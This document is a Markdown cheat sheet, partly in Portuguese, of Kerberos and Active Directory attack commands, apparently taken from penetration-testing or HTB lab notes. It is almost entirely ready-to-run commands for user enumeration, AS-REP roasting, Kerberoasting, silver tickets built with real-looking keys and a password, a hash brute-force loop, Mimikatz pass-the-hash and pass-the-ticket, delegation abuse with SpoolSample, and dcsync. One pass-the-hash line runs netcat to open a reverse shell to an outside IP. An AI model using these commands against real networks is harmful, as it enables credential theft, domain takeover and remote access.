Kerberos
========================

- [ ] [**Enumeração de usuário**](#user%20enumeration)
- [ ] [**AS-REP Roasting**](#as-rep%20roasting)
- [ ] [**Kerberoasting**](#kerberoasting)
- [ ] [**Silver Ticket**](#silver%20ticket)
- [ ] [**Over pass the hash**](#over%20pass%20the%20hash)
- [ ] [**Pass the ticket**](#pass%20the%20ticket)
- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)
- [ ] [**Constrained delegation**](#constrained%20delegation)
- [ ] [**Conversões**](#conversoes)

## User enumeration

```
kerbrute userenum -d domain --dc <hostname> users.txt
```

## AS-REP Roasting
```
impacket-GetNPUsers -request domain/ -usersfile usernames.txt -dc-ip <hostname>
```

## Kerberoasting
```
impacket-GetUserSPNs -request domain/user:password -dc-ip <hostname>
```
## Silver Ticket

```
rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt
```

## Over pass the hash

```
impacket-getTGT -hashes :f6b7160bfc91823792e0ac3a162c9267 HTB.LOCAL/Administrator -dc-ip 10.10.10.103
```
    
```
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
klist
```

## Pass the ticket

```
#!/bin/bash
#
for i in $(cat usernames.txt) 
do 
        for j in $(cat nthashes.txt) 
        do 
                echo trying $i:$j 
                echo 
                impacket-getTGT htb.local/$i -hashes $j:$j    
                echo 
                sleep 5 
        done 
done
```

### Rubeus and Mimikatz
```
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:Powershell.exe

sekurlsa::pth /domain:flight.htb /user:R.Cold /ntlm:5607f6eafc91b3506c622f70e7a77ce0 /run:".\n.exe -e cmd 10.10.14.14 8091"
```

m.exe = mimikatz.exe
r.exe = Rubeus.exe

### mimikatz
```
m.exe
privilege::debug
kerberos::ptt <ticket.kirbi>
```

### rubeus

```
r.exe ptt /ticket:0-40e10000-G0$@krbtgt~FLIGHT.HTB-FLIGHT.HTB.kirbi
```

![qownnotes-media-zBGsNi](../../../media/qownnotes-media-zBGsNi.png)

Usando base64 com Rubeus

```
r.exe ptt /ticket:<base64>
```

![](../../../media/Pasted%20image%2020240612162524.png)


## Unconstrained delegation

Pré requisito:
Obter system em uma máquina com a configuração do unconstrained delegation:

Do Kali:

Verificar se a máquina possui a config de unconstrained delegation:

```
impacket-findDelegation -dc-ip <ip_dc> <dominio>/<usuario>:<senha>
```

Para uma máquina que está no domínio, podemos conduzir o ataque de seguinte maneira:

```
Get-DomainComputer -Unconstrained
```

Forçar a autenticação via Kerberos do DC na máquina alvo/comprometida, mas primeiro precisamos verificar se o serviço spool está funcionando:

```
dir \\<dc_hostname>\pipe\spoolss
```

Se estiver:
```
SpoolSample.exe <dc_hostname> <maquina_com_unconstrained_delegation_hostname>
```

Aguardar o TGT do DC chegar:
```
r.exe monitor /monitorinterval:10 /targetuser:DC$ /nowrap
```

ou algum domain admin logar na máquina:

```
r.exe monitor /monitorinterval:10
```

Depois fazer o pass the ticket para fazer o dcsync:

```
mimikatz.exe
debug::privileges
sekurlsa::tickets /export
kerberos::ptt <nome_do_arquivo>.kirbi
lsadump::dcsync /domain:<DomainFQDN> /all
```

## Constrained delegation

Enumerando máquinas com a configuração de "constrained delegation":

Kali:

```
impacket-findDelegation -dc-host <ip_dc> <dominio>/<usuario>:<senha>
```

Powershell
```
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

Powerview
```
Get-DomainUser -TrustedToAuth
```

```
r.exe asktgt /domain:<nome_dominio> /spn:<nome_spn>
```
## Conversoes

Base64 para .kirbi

```
[IO.File]::WriteAllBytes("C:\Users\pentestlab.PURPLE\Desktop\DC.kirbi",[Convert]::FromBase64String("Base64"))
```

Base64 para .kirbi
```
cat arq_com_base64_sem_espacos.txt
...
base64 -d <arq_com_base64_sem_espacos.txt> <output .kirbi> 
```


.kirbi para ccache

```
impacket-ticketConverter test.kirbi test2.ccache
```

ccache para .kirbi

```
impacket-ticketConverter adm.ccache test.kirbi
```

